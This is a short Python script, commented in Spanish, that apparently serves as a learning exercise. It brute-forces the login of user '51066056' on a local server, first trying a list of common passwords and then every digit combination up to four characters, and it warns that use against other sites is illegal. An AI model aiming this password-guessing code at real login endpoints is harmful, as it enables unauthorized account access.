#!/usr/bin/env python3
"""
Cliente de prueba de login (solo el cliente).

Le pega a UN SERVIDOR LOCAL que vos levantas aparte, en tu propia maquina.
Prueba combinaciones de contrasena para el usuario 51066056 y mira la
respuesta HTTP (200 = entro, otra cosa = no).

IMPORTANTE: esto es para TU server local, del que sos duenio. Usarlo contra un
sitio ajeno es acceso no autorizado (ilegal), aunque sea para aprender.

Uso:
    python cliente.py                 # prueba la lista de abajo
    python cliente.py generar         # genera todas las combinaciones (fuerza bruta)
"""

import sys
import itertools
import string

import requests  # si no lo tenes: pip install requests

# ----- Config (ajusta a como levantes tu server) -----
HOST = "127.0.0.1"          # tu compu. Luego podes poner la IP local, ej "192.168.0.15"
PORT = 8000
RUTA = "/login"             # el endpoint de login de tu server
CAMPO_USUARIO = "u"         # nombre del campo del usuario que espera tu server
CAMPO_PASS = "password"     # nombre del campo de la contrasena

USUARIO = "51066056"


def probar(password):
    """Manda un POST de login y devuelve True si entro (codigo 200)."""
    url = f"http://{HOST}:{PORT}{RUTA}"
    datos = {CAMPO_USUARIO: USUARIO, CAMPO_PASS: password}
    try:
        r = requests.post(url, data=datos, timeout=5)
    except requests.exceptions.ConnectionError:
        print(f"[error] no me puedo conectar a {url} -- esta levantado tu server?")
        sys.exit(1)
    ok = r.status_code == 200
    print(f"  u={USUARIO}  pass={password!r}  ->  {r.status_code}  {'OK' if ok else ''}")
    return ok


def desde_lista():
    """Prueba una lista de contrasenas (rapido, lo mas comun)."""
    candidatos = ["1234", "admin", "password", "demo1234", "qwerty"]
    print(f"[cliente] probando {len(candidatos)} contrasenas de la lista...")
    for pw in candidatos:
        if probar(pw):
            print(f"[cliente] >>> entro con: {pw}")
            return
    print("[cliente] ninguna de la lista funciono")


def generando():
    """
    Genera TODAS las combinaciones con un juego de caracteres (fuerza bruta).

    OJO: crece explosivamente. Con digitos (10 chars) y largo 4 son 10.000
    pruebas; con letras+digitos (36) y largo 4 ya son ~1,7 millones. Empeza
    chico. Ajusta CHARSET y LARGO_MAX con cuidado.
    """
    charset = string.digits                 # ej: string.ascii_lowercase + string.digits
    largo_min = 1
    largo_max = 4

    total = sum(len(charset) ** n for n in range(largo_min, largo_max + 1))
    print(f"[cliente] generando combinaciones de '{charset}' largo {largo_min}-{largo_max} "
          f"({total} en total)...")

    for largo in range(largo_min, largo_max + 1):
        for combo in itertools.product(charset, repeat=largo):
            pw = "".join(combo)
            if probar(pw):
                print(f"[cliente] >>> entro con: {pw}")
                return
    print("[cliente] no encontre ninguna combinacion valida")


if __name__ == "__main__":
    modo = sys.argv[1] if len(sys.argv) > 1 else "lista"
    if modo == "generar":
        generando()
    else:
        desde_lista()
